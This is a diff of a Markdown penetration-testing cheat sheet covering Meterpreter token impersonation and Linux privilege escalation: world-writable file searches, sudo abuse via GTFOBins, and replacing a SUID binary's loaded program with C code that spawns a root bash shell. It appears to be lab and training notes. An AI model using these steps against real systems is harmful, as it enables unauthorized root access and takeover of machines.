@@ -47,12 +47,9 @@ Note: if you have a valid user credential you can authenticate in windows target
     ```
 * `impersonate_token <token_name>`
   * `impersonate_token ATTACKDEFENSE\\Administrator` **NOTE: the two backslashes**
-*   You may need to migrate process to a \<user> process
-
-    * Ex. `getpid`: 2628, `ps:`
-      * PID: 2948 | PPID: 2036 NAME: explorer.exe | ARCH: X64 | SESSION:1 | USER: ANTHING\Administrator | PATH: C:\Windows\explorer.exe
-
-
+* You may need to migrate process to a \<user> process
+  * Ex. `getpid`: 2628, `ps:`
+    * PID: 2948 | PPID: 2036 NAME: explorer.exe | ARCH: X64 | SESSION:1 | USER: ANTHING\Administrator | PATH: C:\Windows\explorer.exe
 * `getpid` : 2948
 * Of course you can repeat the process to become NT AUTHORITY\SYSTEM
 
@@ -114,41 +111,59 @@ Note: if you have a valid user credential you can authenticate in windows target
 
 ### Vulnerable program
 
-* Search scripts that execute programs or programs. Search for any vulnerable version. One example: chkrootkit v0.49 (running as root)
-  * `ps aux`
+Search scripts that execute programs or programs. Search for any vulnerable version. One example: chkrootkit v0.49 (running as root)
+
+```sh
+ps aux
+```
 
 ### Weak Permissions
 
-* `find / -not -type l -perm -o+w` world-writable files
-  * Example: maybe you can edit shadow file...
+<pre class="language-sh"><code class="lang-sh"><strong># World-writable files - Ex: maybe you can edit shadow file
+</strong><strong>find / -not -type l -perm -o+w
+</strong></code></pre>
 
 ### Sudo
 
-* `sudo -l`
-  * search on gtfobins how to exploit
+<pre class="language-sh"><code class="lang-sh">sudo -l
+<strong># Search on https://gtfobins.github.io/ how to exploit
+</strong></code></pre>
 
 ### SUID - custom binary
 
 * Premise: you have `binary_name` (with suid) that use/load/execute `loaded_binary`
 * Extract strings from the binary – look for shared libraries or binaries being loaded / executed at runtime
-  * `strings binary_name`
+
+```sh
+strings binary_name
+```
 
 1. Method
-   * `cp /bin/bash /path/to/loaded_binary`
+
+```sh
+cp /bin/bash /path/to/loaded_binary
+```
+
 2. Method
 
-* Delete the loaded binary and replace with a new one:
-* ```
-  #include <stdio.h>
-  #include <stdlib.h>
+Delete the loaded binary and replace with a new one:
 
-  int main() {
-      system("/bin/bash -i"); 
-      return 0;
-  }
-  ```
-* `gcc binary.c -o <loaded_binary>` : compile
-* `./binary_name` : run the binary
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    system("/bin/bash -i"); 
+    return 0;
+}
+```
+
+```sh
+# Compile
+gcc binary.c -o <loaded_binary>
+# Run the binary
+./binary_name
+```
 
 ### Other
 
